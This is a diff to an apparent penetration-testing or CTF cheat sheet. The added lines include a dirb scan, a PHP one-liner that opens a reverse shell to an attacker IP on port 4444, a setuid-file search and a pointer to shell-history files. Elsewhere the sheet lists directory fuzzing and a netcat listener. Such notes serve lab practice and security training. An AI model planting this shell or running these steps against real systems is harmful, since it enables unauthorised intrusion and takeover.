@@ -33,6 +33,8 @@ Seclists: <https://github.com/danielmiessler/SecLists>
 
 `./ffuf -u http://s3.bucket.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt`
 
+`dirb http://10.10.144.50 big.txt`
+
 # Brute Force
 
 ## SSH
@@ -57,6 +59,8 @@ Search in exploit db for wordpress
 
 [Netcat without e](https://medium.com/@shadowslayerqwerty/creating-a-netcat-reverse-shell-without-e-89b45134de99)
 
+`<?php $sock=fsockopen("10.9.231.55",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>`
+
 ### Incoming reverse shell
 
 `nc -nvlp <port>`
@@ -73,6 +77,14 @@ Search in exploit db for wordpress
 
 List sudo rights  
 `sudo -l`
+
+setuid-Bit
+`find . -perm /4000`
+
+# Post Exploitation
+
+Bash History
+~/bash_history ~/zsh_history
 
 # Useful tools
 
